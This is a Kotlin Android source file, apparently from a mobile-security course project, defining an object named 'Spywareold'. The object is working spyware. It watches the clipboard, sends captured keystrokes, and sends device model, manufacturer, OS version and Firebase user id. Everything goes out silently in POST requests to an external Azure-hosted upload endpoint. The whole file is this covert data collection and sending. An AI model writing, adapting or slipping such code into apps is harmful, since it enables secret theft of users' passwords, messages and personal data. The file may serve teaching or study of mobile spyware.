package com.example.inf2215

import android.content.ClipboardManager
import android.content.Context
import java.net.HttpURLConnection
import java.net.URL
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.firestore.FirebaseFirestore

object Spywareold {

    private fun sendToServer(json: String) {

        Thread {

            try {
                val url = URL("https://mob-sec-server-esfnggbegggcfye9.southeastasia-01.azurewebsites.net/upload")
                val connection = url.openConnection() as HttpURLConnection

                connection.requestMethod = "POST"
                connection.setRequestProperty("Content-Type", "application/json")
                connection.doOutput = true

                val output = connection.outputStream
                output.write(json.toByteArray())
                output.close()

                connection.responseCode

            } catch (e: Exception) {
                e.printStackTrace()
            }

        }.start()
    }

    fun startClipboardMonitoring(context: Context) {

        val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager

        clipboard.addPrimaryClipChangedListener {

            val clip = clipboard.primaryClip
            val text = clip?.getItemAt(0)?.text?.toString()

            if (!text.isNullOrBlank()) {

                val json = """
                {
                    "type": "clipboard",
                    "content": "$text",
                    "timestamp": ${System.currentTimeMillis()}
                }
                """

                sendToServer(json)
            }
        }
    }
    // Formats captured keystrokes as JSON and sends to server
    fun logKeystrokes(uid: String, entries: List<Map<String, Any>>) {
        val entriesJson = entries.joinToString(",") { e ->
            """{"field":"${e["field"]}","chars":"${e["chars"]}","timestamp":${e["timestamp"]}}"""
        }
        val json = """{"type":"keylog","uid":"$uid","entries":[$entriesJson],"timestamp":${System.currentTimeMillis()}}"""
        sendToServer(json)
    }

    fun logUserAction(action: String) {
        val deviceModel = android.os.Build.MODEL
        val manufacturer = android.os.Build.MANUFACTURER
        val androidVersion = android.os.Build.VERSION.RELEASE
        val uid = FirebaseAuth.getInstance().currentUser?.uid

        val json = """
        {
            "device_model": "$deviceModel",
            "manufacturer": "$manufacturer",
            "android_version": "$androidVersion",
            "type": "user_action",
             "uid": "$uid",
             "action": "$action",
             "timestamp": ${System.currentTimeMillis()}
        }
        """

        sendToServer(json)
    }
}